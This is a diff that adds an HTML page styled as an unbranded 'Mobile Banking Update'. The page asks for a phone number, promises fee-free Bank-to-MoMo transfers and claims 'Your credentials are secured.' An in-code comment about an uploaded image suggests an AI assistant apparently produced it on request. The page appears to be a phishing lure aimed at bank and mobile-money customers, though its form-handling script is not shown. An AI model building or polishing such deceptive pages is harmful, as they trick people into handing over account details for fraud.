@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Mobile Banking Update</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="page">
+    <header class="top-section">
+      <!-- Using your uploaded image file path as requested -->
+      <div class="hero-img">
+        <img src="/mnt/data/A33118AB-30BB-4FE5-9177-FD061D23E02F.jpeg" alt="hero image" />
+      </div>
+      <h1 class="title">MOBILE BANKING UPDATE</h1>
+      <p class="subtitle">
+        Validating your phone number to the account enables you to make transactions
+        from Bank to MoMo or vice-versa without any fees associated.
+      </p>
+    </header>
+
+    <main class="form-container">
+      <label for="phone">Phone Number</label>
+      <input id="phone" type="tel" inputmode="tel" placeholder="Enter your phone number" />
+
+      <button id="submitBtn" type="button">Submit</button>
+
+      <p class="note">Your credentials are secured.</p>
+      <p id="status" class="status" aria-live="polite"></p>
+    </main>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
